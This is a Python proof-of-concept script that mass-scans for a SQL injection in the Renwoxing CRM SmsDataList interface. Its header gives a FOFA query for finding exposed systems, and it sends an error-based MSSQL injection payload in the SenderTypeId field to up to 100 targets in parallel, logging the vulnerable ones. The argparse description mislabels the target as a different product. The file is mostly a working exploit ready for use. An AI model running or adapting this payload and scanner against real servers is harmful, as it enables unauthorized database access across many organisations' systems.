# 任我行CRM系统SmsDataList接口存在SQL注入漏洞
# fofa:"欢迎使用任我行CRM"

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    test = """                              _                      
  ____                ____        _        _     _     _   
 / ___| _ __ ___  ___|  _ \  __ _| |_ __ _| |   (_)___| |_ 
 \___ \| '_ ` _ \/ __| | | |/ _` | __/ _` | |   | / __| __|
  ___) | | | | | \__ \ |_| | (_| | || (_| | |___| \__ \ |_ 
 |____/|_| |_| |_|___/____/ \__,_|\__\__,_|_____|_|___/\__|
                                                                                                       
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友-时空KSOA SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Upgrade-Insecure-Requests':'1',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    data = "Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"
    try:
        res = requests.get(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if 'dc3949ba59ab' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()